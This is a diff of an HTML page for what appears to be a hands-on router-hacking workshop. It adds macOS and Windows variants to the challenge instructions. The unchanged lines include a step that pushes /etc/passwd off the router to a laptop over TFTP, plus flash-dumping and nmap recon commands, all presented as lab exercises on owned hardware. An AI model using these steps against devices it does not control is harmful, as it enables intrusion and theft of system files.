@@ -135,7 +135,7 @@
   <figure class="quote">
     <img class="avatar" src="images/roald-nefs.png" alt="Roald Nefs" decoding="async">
     <blockquote>
-      <p>I ordered two of these routers from the same webshop a few weeks apart, expecting identical boards. They turned up as different hardware revisions, days before this workshop. So we re-prepped a batch of the older revisions we'd used before, so you can still tackle every challenge across both boards. Looking forward to seeing whether you can solder the header pins more neatly than the previous participants did.</p>
+      <p>I ordered two batches of these routers from the same webshop a few weeks apart, expecting identical boards. They turned up as different hardware revisions, days before this workshop. So we re-prepped a batch of the older revisions we'd used before, so you can still tackle every challenge across both boards. Looking forward to seeing whether you can solder the header pins more neatly than the previous participants did.</p>
       <figcaption><b>Roald Nefs</b> · CTO at Warpnet and Enlite</figcaption>
     </blockquote>
   </figure>
@@ -474,7 +474,9 @@
   <h3>Challenge 14 // Exfil files over TFTP</h3>
   <p>A shell is nice, but get the files <b>off</b> the box. The BusyBox userland ships a <code class="inline">tftp</code> client, so stand up a TFTP server on your laptop and push files to it: no SD card, no USB, just the network.</p>
   <pre><span class="c"># on your host: serve a directory over TFTP (one option)</span>
-<span class="k">sudo</span> dnsmasq --enable-tftp --tftp-root=/srv/tftp -d
+<span class="c"># Linux:   </span><span class="k">sudo</span> dnsmasq --enable-tftp --tftp-root=/srv/tftp -d
+<span class="c"># macOS:   brew install dnsmasq, then the same flags (or the built-in bootpd)</span>
+<span class="c"># Windows: run tftpd64 and point it at a served folder</span>
 <span class="c"># on the router shell: push a file to your host (-p put, -l local file)</span>
 <span class="k">tftp</span> -p -l /etc/passwd <span class="p">192.168.0.100</span></pre>
   <ul class="mission">
@@ -488,7 +490,8 @@
 
   <h3>Challenge 15 // Dump the SPI flash</h3>
   <p>Clip the <b>CH341A</b> onto the SOIC-8 flash chip and read it. These boards use a 4 MB (32 Mbit) part, the <b>EN25QH32B</b>. Line up <b>pin 1</b> (the dot on the chip) with pin 1 of the clip, then verify the programmer sees the chip before you read.</p>
-  <pre><span class="c"># verify the programmer sees the chip</span>
+  <pre><span class="c"># verify the programmer sees the chip (Linux/macOS: sudo; Windows: no sudo,</span>
+<span class="c"># and first install the CH341A WinUSB driver with Zadig)</span>
 <span class="k">sudo</span> flashrom -p ch341a_spi -c <span class="p">"EN25QH32B"</span>
 <span class="c"># read the full 4 MB twice, then compare</span>
 <span class="k">sudo</span> flashrom -p ch341a_spi -c <span class="p">"EN25QH32B"</span> -r dump1.bin
@@ -505,7 +508,7 @@
   </ul>
 
   <figure class="quote">
-    <span class="avatar avatar-ph" aria-hidden="true">J</span>
+    <img class="avatar" src="images/jordi.jpeg" alt="Jordi Gerritsen" decoding="async">
     <blockquote>
       <p>This is exactly how we revived the dead boards. We read the firmware straight off a still-working router with the programmer, then wrote that same image back onto a bricked one. A CH341A reads and writes, so a SPI dump doubles as a restore, and that's how half the v14.0 boards in this room are still alive.</p>
       <figcaption><b>Jordi</b> · Trainer</figcaption>
@@ -527,6 +530,7 @@
 
   <h3>Challenge 17 // Decompress the v14.20 firmware</h3>
   <p>On the <b>v14.20</b> image there is no SquashFS to mount. The firmware is a raw <b>LZMA</b> blob in the old <code class="inline">.lzma</code> (LZMA_ALONE) format: a properties byte (<code class="inline">0x6E</code>), then a 4-byte dictionary size and an 8-byte uncompressed size. Carve from that header and decompress it. It expands to about <b>4 MB</b>: the kernel and userland packed into one monolithic image.</p>
+  <p class="caption-center">On Linux and macOS the <code class="inline">python3 - &lt;&lt;'PY'</code> heredoc runs as-is. On Windows, save the lines between <code class="inline">PY</code> markers to a file such as <code class="inline">decode.py</code> and run <code class="inline">python decode.py</code>. The <code class="inline">strings</code>, <code class="inline">grep</code>, and <code class="inline">head</code> tools ship with Git for Windows (Git Bash).</p>
   <pre><span class="k">python3</span> - &lt;&lt;'PY'
 import lzma
 d=open('dump1.bin','rb').read()
@@ -609,8 +613,10 @@ PY</pre>
   </table>
 
   <h3>Commands</h3>
-  <pre><span class="c"># serial console</span>
+  <pre><span class="c"># serial console (Linux)</span>
 <span class="k">picocom</span> -b 115200 /dev/ttyUSB0
+<span class="c"># macOS:   picocom -b 115200 /dev/tty.usbserial-XXXX</span>
+<span class="c"># Windows: PuTTY / Tera Term → COMx @ 115200 8N1</span>
 <span class="c"># network recon</span>
 <span class="k">nmap</span> -p- -sV 192.168.0.1
 <span class="c"># dump the flash and verify</span>
